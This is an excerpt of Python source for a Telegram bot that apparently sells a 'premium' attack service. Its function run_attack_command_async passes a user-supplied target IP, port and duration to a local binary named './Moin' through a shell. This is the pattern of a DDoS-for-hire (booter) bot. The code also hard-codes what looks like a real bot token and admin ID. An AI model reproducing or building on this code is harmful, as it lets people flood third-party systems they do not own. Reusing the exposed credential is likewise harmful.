...
ADMIN_IDS = [5755964345]
BOT_TOKEN = "7756760436:AAEpTAHmPl0k04ekOkTTdO-oKl0iqdjrcdE"
...
async def run_attack_command_async(target_ip, target_port, duration):
    ...
    process1 = await asyncio.create_subprocess_shell(f"./Moin {target_ip} {target_port} {duration}")    
...
def start_command(message):
    chat_id = message.chat.id
    bot.send_message(chat_id, "WELCOME TO 🥇PREMIUM🥇 USER--> @CRACKER_PRO_M.", reply_markup=main_menu())
